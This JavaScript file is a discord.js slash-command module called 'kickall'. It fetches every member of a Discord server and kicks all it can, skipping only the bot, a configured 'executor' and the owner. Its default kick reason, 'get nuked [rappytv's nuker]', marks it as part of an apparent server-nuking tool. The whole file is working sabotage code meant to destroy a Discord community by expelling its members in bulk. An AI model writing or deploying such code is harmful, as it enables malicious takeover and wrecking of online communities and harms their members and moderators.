const { CommandInteraction, CommandInteractionOptionResolver, GuildMember, User, EmbedBuilder, PermissionsBitField, ApplicationCommandOptionType } = require("discord.js");

module.exports = {
    name: `kickall`,
    options: [
        {
            name: `reason`,
            description: `The kick reason`,
            type: ApplicationCommandOptionType.String,
            required: false
        }
    ],

    /**
     * 
     * @param {CommandInteraction} interaction 
     * @param {CommandInteractionOptionResolver} options 
     * @param {GuildMember} member 
     * @param {User} user 
     */

    async execute(interaction, options, member, user) {
        const { me } = interaction.guild.members;
        if(!me.permissions.has(PermissionsBitField.Flags.KickMembers)) return console.log(`[ERROR] I'm missing the permission KickMembers (1 << 1)! [${interaction.guild.name}]`);
        const members = await interaction.guild.members.fetch();
        members.forEach(async member => {
            if(member.id == me.id || (bot.cfg.executor.trim() != `` && bot.cfg.executor == member.id)) return;
            if(member.guild.ownerId == member.id) return console.log(`[KICK] Skipped ${member.user.tag} (${member.user.id}): Server owner`);
            if(member.roles.highest.position >= me.roles.highest.position) return console.log(`[KICK] Skipped ${member.user.tag} (${member.user.id}): Higher or same role`);
            if(!member.kickable) return console.log(`[KICK] Skipped ${member.user.tag} (${member.user.id}): Not Kickable`);
            await member.kick(options.getString(`reason`) || `get nuked [rappytv's nuker]`)
            .then(() => {
                return console.log(`[KICK] Kicked ${member.user.tag} (${member.user.id})`);
            }).catch((err) => {
                return console.log(`[KICK] Failed to Kicked ${member.user.tag} (${member.user.id}): ${err}`);
            });
        });
    }
}